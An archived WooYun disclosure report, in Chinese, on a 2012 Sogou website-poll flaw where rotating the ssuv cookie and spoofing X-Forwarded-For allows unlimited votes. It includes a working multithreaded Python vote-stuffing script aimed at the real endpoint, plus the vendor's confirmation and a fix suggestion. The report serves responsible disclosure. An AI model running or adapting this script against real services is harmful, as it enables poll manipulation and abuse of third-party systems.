@@ -1,0 +1,274 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		搜狗我最喜爱的网站评选任意刷票漏洞  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		搜狗我最喜爱的网站评选任意刷票漏洞  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/l4yn3">l4yn3</a> 
+</li><li>提交时间：		2012-12-08 15:15</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2012-12-08：	细节已通知厂商并且等待厂商处理中<br/>
+									2012-12-10：	厂商已经确认，细节仅向厂商公开<br/>
+									2012-12-20：	细节向核心白帽子及相关领域专家公开<br/>
+									2012-12-30：	细节向普通白帽子公开<br/>
+									2013-01-09：	细节向实习白帽子公开<br/>
+									2013-01-22：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">搜狗举办的“我最喜爱的网站评选”活动判断不严谨，存在任意刷票漏洞</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">用浏览器投票只能投一次。<br />
+<br />
+但是修改cookie当中的ssuv参数后可以多投几次。<br />
+<br />
+但是投几次后还是提示已经投过票了，明天再来吧。<br />
+<br />
+给http头信息中增加X-Forwarded-For参数可以继续投票。<br />
+<br />
+<br />
+<br />
+总之不断修改cookie当中的ssuv参数和http头信息当中的X-Forwarded-For的参数，即可达到任意投票目的。<br />
+<br />
+<br />
+<br />
+方便你们测试，测试代码送上。<br />
+<br />
+</p><pre><code>#!/usr/bin/python<br />
+#-*-coding:gbk-*-<br />
+import sys<br />
+import urllib<br />
+import urllib2<br />
+import random<br />
+import hashlib<br />
+import time<br />
+import threading<br />
+<br />
+reload(sys)<br />
+sys.setdefaultencoding(&quot;gbk&quot;)<br />
+<br />
+def getstr(n): <br />
+    st = &#039;&#039; <br />
+    while len(st) &lt; n: <br />
+      temp = chr(97+random.randint(0,25)) <br />
+      if st.find(temp) == -1 : <br />
+        st = st.join([&#039;&#039;,temp]) <br />
+    return st<br />
+<br />
+def rush_vote(ip_last_num):<br />
+    my_str = getstr(5)<br />
+    hash_str = hashlib.md5(my_str).hexdigest()<br />
+    <br />
+    header = {<br />
+        &quot;Host&quot;: &quot;123.sogou.com&quot;,<br />
+        &quot;Connection&quot;: &quot;keep-alive&quot;,<br />
+        &quot;Cache-Control&quot;: &quot;max-age=0&quot;,<br />
+        &quot;Origin&quot;: &quot;http://123.sogou.com&quot;,<br />
+        &quot;X-Forwarded-For&quot;: &quot;192.168.10.&quot; + str(ip_last_num),<br />
+        &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11&quot;,<br />
+        &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;,<br />
+        &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&quot;,<br />
+        &quot;Referer&quot;: &quot;http://123.sogou.com/sub/huodong.html&quot;,<br />
+        &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.8&quot;,<br />
+        &quot;Accept-Charset&quot;: &quot;GBK,utf-8;q=0.7,*;q=0.3&quot;,<br />
+        &quot;Cookie&quot;: &quot;SUID=A87F43765A590B0A4E4B1147000A65AS; SUV=1314147641152662; SMYUV=1333688377353101; sct=8; CXID=44816CD75C2C1E64BC0F7F7EAF23186E; IPLOC=CN1101; ssuv=&quot;+hash_str+&quot;; CNZZDATA30074789=cnzz_eid=63247164-1354672656-&amp;ntime=1354672656&amp;cnzz_a=5&amp;retime=1354672675763&amp;sin=&amp;ltime=1354672675763&amp;rtime=0; spid=; GOTO=&quot;,<br />
+    }<br />
+    <br />
+    datas = {<br />
+        &quot;id[]&quot;:123,  #待投票网站id，想投给谁修改即可<br />
+        &quot;user_name&quot;:&quot;&quot;,<br />
+        &quot;user_num&quot;:&quot;&quot;,<br />
+        &quot;user_email&quot;:&quot;&quot;,<br />
+        &quot;user_address&quot;:&quot;&quot;,<br />
+    }<br />
+    datas = urllib.urlencode(datas)<br />
+    request = urllib2.Request(&quot;http://123.sogou.com/sub/hd/vote_new.php&quot;, data = datas, headers = header)<br />
+    f = urllib2.urlopen(request)<br />
+    content = f.read()<br />
+    return content<br />
+<br />
+class my_thread(threading.Thread):<br />
+    def __init__(self, ip_last_num):<br />
+        threading.Thread.__init__(self)<br />
+        self.ip_last_num = ip_last_num<br />
+    <br />
+    def run(self):<br />
+        for i in range(1, 3000):<br />
+            content = rush_vote(self.ip_last_num)<br />
+            if content.find(&quot;投票成功，感谢您的参与！&quot;) != -1:<br />
+                print &#039;%s Vote success.\r\n&#039; % str(i)<br />
+            else:<br />
+                print &#039;投票失败，中断, 重新调整ip&#039; + &quot;\r\n&quot;<br />
+                self.ip_last_num = self.ip_last_num + 20<br />
+                self.run()<br />
+            time.sleep(10)<br />
+        <br />
+mythread = {}<br />
+for row in range(40, 80):  #开40个线程<br />
+    mythread[row] = my_thread(row)<br />
+    mythread[row].start()<br />
+<br />
+print &quot;投票成功&quot;</code></pre><p class='detail'> </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">随便找一个网站。<br />
+<br />
+刷票之前票数：<br />
+<br />
+</p><p class="detail"><a href="../images/072000088f74467e554f6dddfefe73d16e8a052e.jpg" target="_blank"><img src="../images/072000088f74467e554f6dddfefe73d16e8a052e.jpg" alt="toupiaozhiqian.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+开40个线程，两分钟后：<br />
+<br />
+</p><p class="detail"><a href="../images/072006221470a0841f476bc5185e2845ef736178.jpg" target="_blank"><img src="../images/072006221470a0841f476bc5185e2845ef736178.jpg" alt="yifenduozhonghou.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+Over，测试而已。赶快处理吧，不然有失公正。<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+ </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">X-Forwarded-For可以伪造，用别的做验证吧。 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/l4yn3" title="l4yn3">l4yn3</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-015738" title="搜狗我最喜爱的网站评选任意刷票漏洞">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：中</p>
+						<p class="detail">漏洞Rank：7 </p>
+													<p class="detail">确认时间：2012-12-10 08:12</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">处理中</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="15738";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
